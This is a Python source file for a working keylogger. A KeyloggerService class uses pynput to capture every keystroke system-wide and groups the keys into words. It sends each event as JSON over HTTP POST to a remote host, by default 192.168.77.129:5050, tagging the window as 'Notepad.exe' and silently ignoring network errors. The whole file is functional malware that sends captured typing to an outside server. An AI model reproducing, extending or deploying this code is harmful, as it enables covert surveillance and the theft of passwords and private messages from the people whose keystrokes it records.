from pynput import keyboard
from datetime import datetime
import string
import threading
import time
import queue
import sys
import urllib.request
import json

HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.77.129"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5050
URL  = f"http://{HOST}:{PORT}/event"

class KeyloggerService:
    def __init__(self, callback, combine=True, idle_ms=800, ui_queue=None):
        """
        callback: function(str) -> None  (receives plaintext line to be encrypted+written)
        combine: if True, buffer characters into words/sentences
        idle_ms: flush buffer after this many ms of no typing
        ui_queue: optional Queue to forward events to the GUI live (dicts)
        """
        self._callback = callback
        self.combine = combine
        self.idle_ms = idle_ms
        self._buf = []
        self._last_ts = 0.0
        self._idle_timer = None
        self._running = False
        self._ui_queue = ui_queue

        # define what counts as printable char we merge
        self._printables = set(string.printable) - set("\r\n\t")

        # punctuation that should flush a chunk (end of word/sentence feel)
        self._flush_punct = set(" .,!?:;)]}")

    def _post(self, evt):
        data = json.dumps(evt).encode("utf-8")
        req = urllib.request.Request(URL, data=data,
                                     headers={"Content-Type": "application/json"},
                                     method="POST")
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                resp.read()
        except Exception as e:
            # Optionally handle exceptions (e.g., log)
            pass

    def _now_str(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def _flush(self):
        if not self._buf:
            return
        text = "".join(self._buf)
        self._buf.clear()
        self._send_line(text, kind="TEXT")

    def _schedule_idle_flush(self):
        if self._idle_timer:
            self._idle_timer.cancel()
        if self.idle_ms <= 0:
            return
        self._idle_timer = threading.Timer(self.idle_ms / 1000.0, self._flush)
        self._idle_timer.daemon = True
        self._idle_timer.start()

    def _forward_to_ui(self, *, ts, kind, text):
        if not self._ui_queue:
            return
        evt = {
            "ts": ts,
            "type": kind.upper(),
            "key": text,
            "window": "",
            "_already_logged": True,
        }
        try:
            self._ui_queue.put_nowait(evt)
        except Exception:
            pass

    def _send_line(self, text, kind=None):
        ts = self._now_str()
        line = f"{ts} - {text}"
        self._callback(line)

        if kind is None:
            # Determine kind based on content
            kind = "KEY" if (text.startswith("[") and text.endswith("]")) else "TEXT"

        self._forward_to_ui(ts=ts, kind=kind, text=text)

        # Post event to server
        evt = {
            "type": kind,
            "key": text,
            "window": "Notepad.exe",
            "ts": ts
        }
        self._post(evt)

    def _on_press(self, key):
        ts = time.time()
        self._last_ts = ts

        try:
            ch = key.char
        except AttributeError:
            ch = None

        if not self.combine:
            # emit one event per key
            if ch is not None:
                self._send_line(ch, kind="TEXT" if len(ch) == 1 else "KEY")
            else:
                name = getattr(key, "name", str(key))
                self._send_line(f"[{name}]", kind="KEY")
            return

        # combine mode
        if ch is not None:
            if ch in self._printables:
                self._buf.append(ch)
                if ch in self._flush_punct:
                    self._flush()
                else:
                    self._schedule_idle_flush()
            else:
                self._flush()
                self._send_line(f"[NonPrintable:{repr(ch)}]", kind="KEY")
            return

        # handle special keys
        name = getattr(key, "name", str(key))
        if name in ("space",):
            self._buf.append(" ")
            self._schedule_idle_flush()
        elif name in ("enter", "return"):
            self._flush()
            self._send_line("[Enter]", kind="KEY")
        elif name in ("tab",):
            self._buf.append("\t")
            self._flush()
        elif name.startswith("backspace"):
            if self._buf:
                self._buf.pop()
                self._schedule_idle_flush()
            else:
                self._send_line("[Backspace]", kind="KEY")
        else:
            self._flush()
            pretty = name.replace("_", " ").title()
            self._send_line(f"[{pretty}]", kind="KEY")

    def start(self):
        if self._running:
            return
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.daemon = True
        self._listener.start()
        self._running = True

    def stop(self):
        if self._idle_timer:
            self._idle_timer.cancel()
            self._idle_timer = None
        self._flush()
        if self._listener:
            self._listener.stop()
            self._listener = None
        self._running = False

    def set_ui_queue(self, q):
        self._ui_queue = q

# Usage example:
def main():
    def print_line(line):
        print(line)

    ui_q = queue.Queue()

    keylogger = KeyloggerService(callback=print_line, combine=True, idle_ms=800, ui_queue=ui_q)
    keylogger.start()

    try:
        while True:
            time.sleep(1)
            # You can process UI queue here if needed
    except KeyboardInterrupt:
        keylogger.stop()

if __name__ == "__main__":
    main()